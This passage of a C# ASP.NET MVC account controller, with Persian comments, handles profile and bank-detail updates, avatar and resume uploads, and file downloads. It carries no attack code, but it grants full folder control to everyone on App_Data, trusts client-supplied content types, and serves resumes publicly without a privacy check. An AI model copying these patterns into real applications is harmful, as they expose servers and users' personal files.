				UnitOfWork.UserRepository
				.GetByCellPhoneNumberExceptId
				(viewModel.CellPhoneNumber, oOriginalUser.Id);

			if (oUser != null)
			{
				// مقدار فيلد شماره تلفن همراه تکراری است! لطفا از مقدار ديگری استفاده نماييد
				string strErrorMessage =
					string.Format(Resources.Messages.DuplicateError,
					Resources.Models.User.CellPhoneNumber);

				ModelState.AddModelError("CellPhoneNumber", strErrorMessage);
			}

			if (Infrastructure.ApplicationSettings.Instance.CheckNationalCode)
			{
				if (string.IsNullOrWhiteSpace(viewModel.NationalCode) == false)
				{
					if (Infrastructure.Utility.CheckNationalCode(viewModel.NationalCode) == false)
					{
						// مقدار فيلد معتبر نمی‌باشد
						string strErrorMessage =
							string.Format(Resources.Messages.UnvalidatedValue,
							Resources.Models.User.NationalCode);

						ModelState.AddModelError("NationalCode", strErrorMessage);
					}
				}
			}

			if (ModelState.IsValid)
			{
				bool blnUserChangedCellPhoneNumber = false;

				// **************************************************
				// **************************************************
				// **************************************************
				if (viewModel.CellPhoneNumber != oOriginalUser.CellPhoneNumber)
				{
					blnUserChangedCellPhoneNumber = true;

					oOriginalUser.CellPhoneNumberVerificationKey =
						Models.User.GetCellPhoneNumberVerificationKey();

					oOriginalUser.IsCellPhoneNumberVerified = false;
					oOriginalUser.CellPhoneNumber = viewModel.CellPhoneNumber;
				}

				// دقت کنيد که دستورات ذيل نبايد نوشته شود
				//oOriginalUser.EmailAddress = viewModel.EmailAddress;
				//oOriginalUser.IsCellPhoneNumberVerified = viewModel.IsCellPhoneNumberVerified;

				// دقت کنيد که دستور ذيل بايد به شکل ذيل نوشته شود
				oOriginalUser.BirthDate.Value = viewModel.BirthDate.Value;
				// و نه به شکل ذيل
				//oOriginalUser.BirthDate = viewModel.BirthDate;

				oOriginalUser.GenderId = viewModel.GenderId;
				oOriginalUser.JobTitle = viewModel.JobTitle;
				oOriginalUser.LastName = viewModel.LastName;
				oOriginalUser.FirstName = viewModel.FirstName;
				oOriginalUser.CompanyName = viewModel.CompanyName;
				oOriginalUser.Description = viewModel.Description;
				oOriginalUser.HomePageUrl = viewModel.HomePageUrl;
				oOriginalUser.NationalCode = viewModel.NationalCode;
				oOriginalUser.IsAvatarPublic = viewModel.IsAvatarPublic;
				oOriginalUser.IsProfilePublic = viewModel.IsProfilePublic;
				oOriginalUser.IsBirthDatePublic = viewModel.IsBirthDatePublic;
				oOriginalUser.IsEmailAddressPublic = viewModel.IsEmailAddressPublic;
				oOriginalUser.IsCellPhoneNumberPublic = viewModel.IsCellPhoneNumberPublic;

				oOriginalUser.ProfileLevel =
					Infrastructure.GlobalApplicationSettings.Instance.CurrentUserProfileLevel;
				// **************************************************

				// **************************************************
				oOriginalUser.SetUpdateDateTime(oOriginalUser.Id);

				oOriginalUser.SetIsVerified
					(false, Infrastructure.Sessions.AuthenticatedUser.Id);
				// **************************************************
				// **************************************************
				// **************************************************

				UnitOfWork.UserRepository.Update(oOriginalUser);

				UnitOfWork.Save();

				// **************************************************
				Infrastructure.AuthenticatedUser oAuthenticatedUser =
					new Infrastructure.AuthenticatedUser(oOriginalUser);

				Infrastructure.Sessions.AuthenticatedUser = oAuthenticatedUser;
				// **************************************************

				Infrastructure.NotificationService
					.NotifyUserAfterUpdatingProfile(oOriginalUser);

				if (blnUserChangedCellPhoneNumber)
				{
					Infrastructure.NotificationService
						.SendCellPhoneNumberVerificationKey(oOriginalUser);
				}

				// اطلاعات شما با موفقيت ثبت گرديد
				PageMessages.Add(new Infrastructure.PageMessage
					(Infrastructure.Enums.PageMessageTyps.Information,
					Resources.Messages.Information002));
			}

			// **************************************************
			var varGenders =
				UnitOfWork.GenderRepository
				.GetActiveByCultureLcid(CultureLcid);

			ViewBag.GenderId =
				new System.Web.Mvc.SelectList
					(varGenders, "Id", "Name1", oOriginalUser.GenderId);
			// **************************************************

			return (View(viewModel));
		}

		[System.Web.Mvc.HttpGet]
		[Infrastructure.Attributes.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Registered,
			resourceType: typeof(Resources.Models.User),
			resourceName: Resources.Models.Strings.UserKeys.UpdateUserBankInformation)]
		public virtual System.Web.Mvc.ActionResult UpdateUserBankInformation()
		{
			Models.User oUser =
				UnitOfWork.UserRepository
				.GetById(Infrastructure.Sessions.AuthenticatedUser.Id);

			if (oUser == null)
			{
				return (RedirectToAction
					(MVC.Error.Display(System.Net.HttpStatusCode.NotFound)));
			}

			ViewModels.Account.UpdateUserBankInformationViewModel oViewModel =
				new ViewModels.Account.UpdateUserBankInformationViewModel();

			oViewModel.BankName = oUser.BankName;
			oViewModel.BankCardNumber = oUser.BankCardNumber;
			oViewModel.BankShabaNumber = oUser.BankShabaNumber;
			oViewModel.BankAccountNumber = oUser.BankAccountNumber;

			return (View(model: oViewModel));
		}

		[System.Web.Mvc.HttpPost]
		[Infrastructure.Attributes.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Registered,
			resourceType: typeof(Resources.Models.User),
			resourceName: Resources.Models.Strings.UserKeys.UpdateUserBankInformation)]
		public virtual System.Web.Mvc.ActionResult UpdateUserBankInformation
			(ViewModels.Account.UpdateUserBankInformationViewModel viewModel)
		{
			Models.User oOriginalUser =
				UnitOfWork.UserRepository
				.GetById(Infrastructure.Sessions.AuthenticatedUser.Id);

			if (oOriginalUser == null)
			{
				return (RedirectToAction
					(MVC.Error.Display(System.Net.HttpStatusCode.NotFound)));
			}

			if (ModelState.IsValid)
			{
				// **************************************************
				oOriginalUser.BankName = viewModel.BankName;
				oOriginalUser.BankCardNumber = viewModel.BankCardNumber;
				oOriginalUser.BankShabaNumber = viewModel.BankShabaNumber;
				oOriginalUser.BankAccountNumber = viewModel.BankAccountNumber;
				// **************************************************

				UnitOfWork.UserRepository.Update(oOriginalUser);

				UnitOfWork.Save();

				// **************************************************
				string strInformationMessage =
					Resources.Messages.Information002;

				// اطلاعات شما با موفقيت ثبت گرديد
				PageMessages.Add
					(new Infrastructure.PageMessage
						(Infrastructure.Enums.PageMessageTyps.Information, strInformationMessage));
				// **************************************************
			}

			return (View(model: viewModel));
		}

		[System.Web.Mvc.HttpGet]
		[Infrastructure.Attributes.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Registered,
			resourceName: Resources.Strings.ActionsKeys.UploadAvatar)]
		public virtual System.Web.Mvc.ActionResult UploadAvatar()
		{
			Models.User oUser =
				UnitOfWork.UserRepository.Get()
				.Where(current => current.Id ==
					Infrastructure.Sessions.AuthenticatedUser.Id)
				.FirstOrDefault();

			if (oUser == null)
			{
				return (RedirectToAction
					(MVC.Error.Display(System.Net.HttpStatusCode.NotFound)));
			}

			return (View(oUser));
		}

		[System.Web.Mvc.HttpPost]
		[System.Web.Mvc.ActionName("UploadAvatar")]
		[Infrastructure.Attributes.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Registered,
			resourceName: Resources.Strings.ActionsKeys.UploadAvatar)]
		public virtual System.Web.Mvc.ActionResult UploadAvatarConfirmed()
		{
			Models.User oUser =
				UnitOfWork.UserRepository.Get()
				.Where(current => current.Id ==
					Infrastructure.Sessions.AuthenticatedUser.Id)
				.FirstOrDefault();

			if (oUser == null)
			{
				return (RedirectToAction
					(MVC.Error.Display(System.Net.HttpStatusCode.NotFound)));
			}

			// **************************************************
			System.Web.HttpPostedFileBase oPostedFile = null;

			if (Request.Files.Count == 0)
			{
				// فايلی برای آپلود مشخص نکرده‌ايد
				ModelState.AddModelError
					(string.Empty, Resources.Messages.Error100);
			}
			else
			{
				oPostedFile = Request.Files[0];

				string strErrorMessage =
					CheckPictrueValidation(oPostedFile);

				if (string.IsNullOrEmpty(strErrorMessage) == false)
				{
					ModelState.AddModelError(string.Empty, strErrorMessage);
				}
			}
			// **************************************************

			if (ModelState.IsValid)
			{
				// **************************************************
				string strParentPath =
					Server.MapPath("~/App_Data");

				Dtx.IO.Directory.SetFullControlForEveryOne(strParentPath);
				// **************************************************

				// **************************************************
				string strPath =
					string.Format("{0}\\UserAvatars", strParentPath);

				if (System.IO.Directory.Exists(strPath) == false)
				{
					System.IO.Directory.CreateDirectory(strPath);
				}
				// **************************************************

				// **************************************************
				string strExtension =
					System.IO.Path.GetExtension(oPostedFile.FileName).ToLower();

				if (strExtension.Length > Models.Constants.FILE_EXTENSION_LENGTH)
				{
					strExtension =
						strExtension.Substring(0, Models.Constants.FILE_EXTENSION_LENGTH);
				}
				// **************************************************

				// **************************************************
				string strPathName =
					string.Format("{0}\\{1}{2}",
					strPath, oUser.Id, strExtension);

				if (System.IO.File.Exists(strPathName))
				{
					System.IO.File.Delete(strPathName);
				}

				oPostedFile.SaveAs(strPathName);
				// **************************************************

				// **************************************************
				oUser.HasAvatar = true;
				oUser.AvatarExtension = strExtension;

				UnitOfWork.UserRepository.Update(oUser);

				UnitOfWork.Save();
				// **************************************************

				// عکس شما با موفقيت ارسال گرديد
				PageMessages.Add(new Infrastructure.PageMessage
					(Infrastructure.Enums.PageMessageTyps.Information,
					Resources.Messages.Information004));

				return (View(oUser));
			}

			return (View(oUser));
		}

		private string CheckPictrueValidation(System.Web.HttpPostedFileBase postedFile)
		{
			string strErrorMessage = string.Empty;

			if (postedFile.ContentLength == 0)
			{
				strErrorMessage = "فايل به درستی آپلود نشده است!";
				return (strErrorMessage);
			}

			string strExtension =
				System.IO.Path.GetExtension(postedFile.FileName).ToLower();

			if (strExtension.Length > Models.Constants.FILE_EXTENSION_LENGTH)
			{
				strExtension =
					strExtension.Substring(0, Models.Constants.FILE_EXTENSION_LENGTH);
			}

			switch (strExtension)
			{
				case ".gif":
				case ".png":
				case ".jpg":
				case ".jpeg":
				{
					break;
				}

				default:
				{
					strErrorMessage =
						"برای فايل‌های عکس تنها فرمت های JPG, GIF, PNG قابل قبول می باشد!";
					return (strErrorMessage);
				}
			}

			string strContentType = postedFile.ContentType;

			switch (strContentType.ToLower())
			{
				case "image/gif":
				case "image/png":
				case "image/jpeg":
				case "image/pjpeg":
				{
					break;
				}

				default:
				{
					strErrorMessage =
						"برای فايل‌های عکس تنها فرمت های JPG, GIF, PNG قابل قبول می باشد!";
					return (strErrorMessage);
				}
			}

			return (strErrorMessage);
		}

		[System.Web.Mvc.HttpGet]
		[Infrastructure.Attributes.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Public,
			resourceName: Resources.Strings.ActionsKeys.DisplayUserAvatar)]
		public virtual System.Web.Mvc.ActionResult DisplayUserAvatar
			(System.Guid? id = null, int? width = null, int? height = null)
		{
			if (id.HasValue == false)
			{
				return (Infrastructure.Image.NoPhoto(width, height));
			}

			Models.User oUser =
				UnitOfWork.UserRepository.Get()
				.Where(current => current.Id == id)
				.FirstOrDefault();

			if (oUser == null)
			{
				return (Infrastructure.Image.NoPhoto(width, height));
			}

			if ((Infrastructure.AuthenticatedUser.IsAuthenticated) &&
				(Infrastructure.Sessions.AuthenticatedUser.Role == Models.Enums.Roles.Owner ||
				Infrastructure.Sessions.AuthenticatedUser.Role == Models.Enums.Roles.Programmer ||
				Infrastructure.Sessions.AuthenticatedUser.Role == Models.Enums.Roles.Administrator))
			{
			}
			else
			{
				if ((oUser.IsActive == false) ||
					(oUser.IsProfilePublic == false) ||
					(oUser.IsDeleted) ||
					(oUser.IsInBlackList) ||
					(oUser.IsAccountTerminated))
				{
					return (Infrastructure.Image.NoPhoto(width, height));
				}
			}

			string strFileName =
				string.Format("{0}{1}", oUser.Id, oUser.AvatarExtension);

			string strRootRelativePathName =
				string.Format("~/App_Data/UserAvatars/{0}", strFileName);

			string strPathName =
				Server.MapPath(strRootRelativePathName);

			if (System.IO.File.Exists(strPathName) == false)
			{
				return (Infrastructure.Image.NoPhoto(width, height));
			}

			System.IO.MemoryStream oMemoryStream =
				Infrastructure.Image.GetPhoto(strPathName, width, height);

			return (File(oMemoryStream.ToArray(),
				contentType: "image/jpeg", fileDownloadName: strFileName));
		}

		// *****

		[System.Web.Mvc.HttpGet]
		[Infrastructure.Attributes.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Registered,
			resourceName: Resources.Strings.ActionsKeys.UploadResume)]
		public virtual System.Web.Mvc.ActionResult UploadResume()
		{
			Models.User oUser =
				UnitOfWork.UserRepository.Get()
				.Where(current => current.Id ==
					Infrastructure.Sessions.AuthenticatedUser.Id)
				.FirstOrDefault();

			if (oUser == null)
			{
				return (RedirectToAction
					(MVC.Error.Display(System.Net.HttpStatusCode.NotFound)));
			}

			return (View(oUser));
		}

		[System.Web.Mvc.HttpPost]
		[System.Web.Mvc.ActionName("UploadResume")]
		[Infrastructure.Attributes.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Registered,
			resourceName: Resources.Strings.ActionsKeys.UploadResume)]
		public virtual System.Web.Mvc.ActionResult UploadResumeConfirmed()
		{
			Models.User oUser =
				UnitOfWork.UserRepository.Get()
				.Where(current => current.Id ==
					Infrastructure.Sessions.AuthenticatedUser.Id)
				.FirstOrDefault();

			if (oUser == null)
			{
				return (RedirectToAction
					(MVC.Error.Display(System.Net.HttpStatusCode.NotFound)));
			}

			// **************************************************
			System.Web.HttpPostedFileBase oPostedFile = null;

			if (Request.Files.Count == 0)
			{
				// فايلی برای آپلود مشخص نکرده‌ايد
				ModelState.AddModelError
					(string.Empty, Resources.Messages.Error100);
			}
			else
			{
				oPostedFile = Request.Files[0];

				string strErrorMessage =
					CheckResumeValidation(oPostedFile);

				if (string.IsNullOrEmpty(strErrorMessage) == false)
				{
					ModelState.AddModelError(string.Empty, strErrorMessage);
				}
			}
			// **************************************************

			if (ModelState.IsValid)
			{
				// **************************************************
				string strParentPath =
					Server.MapPath("~/App_Data");

				Dtx.IO.Directory.SetFullControlForEveryOne(strParentPath);
				// **************************************************

				// **************************************************
				string strPath =
					string.Format("{0}\\UserResumes", strParentPath);

				if (System.IO.Directory.Exists(strPath) == false)
				{
					System.IO.Directory.CreateDirectory(strPath);
				}
				// **************************************************

				// **************************************************
				string strExtension =
					System.IO.Path.GetExtension(oPostedFile.FileName).ToLower();

				if (strExtension.Length > Models.Constants.FILE_EXTENSION_LENGTH)
				{
					strExtension =
						strExtension.Substring(0, Models.Constants.FILE_EXTENSION_LENGTH);
				}
				// **************************************************

				// **************************************************
				string strPathName =
					string.Format("{0}\\{1}{2}",
					strPath, oUser.Id, strExtension);

				if (System.IO.File.Exists(strPathName))
				{
					System.IO.File.Delete(strPathName);
				}

				oPostedFile.SaveAs(strPathName);
				// **************************************************

				// **************************************************
				oUser.HasResume = true;
				oUser.ResumeExtension = strExtension;

				UnitOfWork.UserRepository.Update(oUser);

				UnitOfWork.Save();
				// **************************************************

				// رزومه شما با موفقيت ارسال گرديد
				PageMessages.Add(new Infrastructure.PageMessage
					(Infrastructure.Enums.PageMessageTyps.Information,
					Resources.Messages.Information005));

				return (View(oUser));
			}

			return (View(oUser));
		}

		private string CheckResumeValidation(System.Web.HttpPostedFileBase postedFile)
		{
			string strErrorMessage = string.Empty;

			if (postedFile.ContentLength == 0)
			{
				strErrorMessage = "فايل به درستی آپلود نشده است!";
				return (strErrorMessage);
			}

			string strExtension =
				System.IO.Path.GetExtension(postedFile.FileName).ToLower();

			if (strExtension.Length > Models.Constants.FILE_EXTENSION_LENGTH)
			{
				strExtension =
					strExtension.Substring(0, Models.Constants.FILE_EXTENSION_LENGTH);
			}

			switch (strExtension)
			{
				case ".doc":
				case ".pdf":
				case ".docx":
				{
					break;
				}

				default:
				{
					strErrorMessage =
						"برای فايل‌ رزومه تنها فرمت های DOC, DOCX, PDF قابل قبول می باشد!";
					return (strErrorMessage);
				}
			}

			string strContentType = postedFile.ContentType;

			switch (strContentType.ToLower())
			{
				case "application/pdf":
				case "application/msword":
				case "application/vnd.ms-word.document.12":
				case "application/vnd.openxmlformats-officedocument.wordprocessingml.document":
				{
					break;
				}

				default:
				{
					strErrorMessage =
						"برای فايل‌ رزومه تنها فرمت های DOC, DOCX, PDF قابل قبول می باشد!";
					return (strErrorMessage);
				}
			}

			return (strErrorMessage);
		}

		[System.Web.Mvc.HttpGet]
		[Infrastructure.Attributes.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Public,
			resourceName: Resources.Strings.ActionsKeys.DownloadResume)]
		public virtual System.Web.Mvc.ActionResult DownloadResume(System.Guid? id = null)
		{
			if (id.HasValue == false)
			{
				return (null);
			}

			Models.User oUser =
				UnitOfWork.UserRepository.Get()
				.Where(current => current.Id == id)
				.FirstOrDefault();

			if (oUser == null)
			{
				return (null);
			}

			if (oUser.IsActive == false)
			{
				return (null);
			}

			string strFileName =
				string.Format("{0}{1}", oUser.Id, oUser.ResumeExtension);

			string strRootRelativePathName =
				string.Format("~/App_Data/UserResumes/{0}", strFileName);

			string strPathName =
				Server.MapPath(strRootRelativePathName);

			if (System.IO.File.Exists(strPathName) == false)
			{
				return (null);
			}

			strFileName =
				string.Format("{0}{1}", oUser.FullName, oUser.ResumeExtension);

			switch (oUser.ResumeExtension.ToLower())
			{
				case ".doc":
				{
					return (File(strPathName,
						contentType: "application/msword",
						fileDownloadName: strFileName));
				}

				case ".docx":
				{
					return (File(strPathName,
						contentType: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
						fileDownloadName: strFileName));
				}

				case ".pdf":
				{
					return (File(strPathName,
						contentType: "application/pdf",
						fileDownloadName: strFileName));
				}

				default:
				{
					return (null);
				}
			}
		}
	}
}
